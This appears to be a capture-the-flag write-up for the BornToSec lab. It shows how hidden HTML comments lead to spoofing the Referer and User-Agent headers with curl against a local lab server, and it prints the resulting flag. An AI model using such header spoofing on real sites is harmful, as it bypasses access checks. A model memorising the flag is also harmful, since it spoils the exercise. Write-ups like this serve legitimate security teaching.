# 06_spoof_curl

Manipulation of HTTP headers

## Method

From the site index, click on the 'BornToSec' link at the bottom of the page.

- By inspecting the HTML code of the page,
We notice that the html source has lots of comments,

there's an entire article written there.

But there's one important line that says:

```

<!--
You must cumming from : "https://www.nsa.gov/" to go to the next step
-->

```

- We deduce that the header must be modified before sending the request to the page, in this case the 'Referer' and 'User-Agent' fields.

normally the browser sets this field to the previous address visited,
but we can be spoof it to be the one we want

Open terminal and type the following instructions:

```

kmatjeke% curl 'http://192.168.1.102/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' -s -o before.html
kmatjeke% curl 'http://192.168.1.102/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' -H "Referer: https://www.nsa.gov/" -s -o after.html 
kmatjeke% diff before.html after.html 
37c37
< <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
---
> FIRST STEP DONE<audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">

```

Notice that it says first step done. Which means we're on the right track

Another important line/comment we notice in the pages inspect article is:

```

<!--
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->

```

Which must refer to the User-Agent http request header(found after lots and lots of research)
let's spoof it and see what happens, we just need to append -H "User-Agent: ft_bornToSec" to our curl command

```

kmatjeke% curl 'http://192.168.1.102/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" -s -o ftbts.html
kmatjeke% diff before.html ftbts.html 
37c37
< <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
---
> <center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
kmatjeke% 

```

We get the flag:    f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
